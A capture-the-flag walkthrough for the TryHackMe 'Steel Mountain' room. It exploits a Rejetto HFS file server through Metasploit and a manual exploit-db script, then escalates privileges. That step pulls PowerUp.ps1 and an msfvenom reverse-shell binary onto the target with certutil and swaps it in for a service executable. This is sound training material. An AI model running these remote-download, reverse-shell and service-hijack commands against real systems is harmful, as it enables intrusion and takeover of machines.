# Steel Mountain

**Room Link:** [https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

## **Walkthrough**

**Introduction**

**Who is the employee of the month?**

<figure><img src="../../.gitbook/assets/image (9) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **Initial Access**

**Scan the machine with nmap. What is the other port running a web server on?**

```
nmap -A 10.10.248.189
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Take a look at the other web server. What file server is running?**

Google this

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

**What is the CVE number to exploit this file server?**

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Use Metasploit to get an initial shell. What is the user flag?**

```
msfconsole 
use exploit/windows/http/rejetto_hfs_exec 
set LHOST 10.10.62.157 
set RHOSTS 10.10.181.159 
set RPORT 8080
exploit
```

**Option #2  Without Metasploit to get an initial shell. What is the user flag?**

**Exploit Link:** [https://www.exploit-db.com/raw/39161](https://www.exploit-db.com/raw/39161)

For this exploit we usually just need to change the ip\_addr and local\_port to our nc listener

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Because I performed this on a tryhackme attacker box which has port 80 in user to login through web I had to change the exploit to get the nc.exe from us on a different port.&#x20;

<figure><img src="../../.gitbook/assets/image (6) (2) (1).png" alt=""><figcaption></figcaption></figure>

```
nc -nvlp 443
cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe .
python2 -m SimpleHTTPServer 81
python2 exploit.py 10.10.181.159 8080
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Use Metasploit to get an initial shell. What is the user flag?**

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 
python2 -m SimpleHTTPServer 81
```

**Windows**

```
certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1 
. .\PowerUp.ps1 
Invoke-AllChecks
```

<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.228.214 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

I couldn't delete the ASCService.exe but I could replace it when I copied the file over with certutil

**Victim**&#x20;

```
cd C:\Program Files (x86)\IObit\Advanced SystemCare
sc stop AdvancedSystemCareService9 
certutil -urlcache -f http://10.10.228.214:81/ASCService.exe ASCService.exe
```

**Kali**

```
nc -lvnp 4443
```

**Victim**

```
sc start AdvancedSystemCareService9
```

![](<../../.gitbook/assets/image (3) (1) (2) (1) (1) (1).png>)





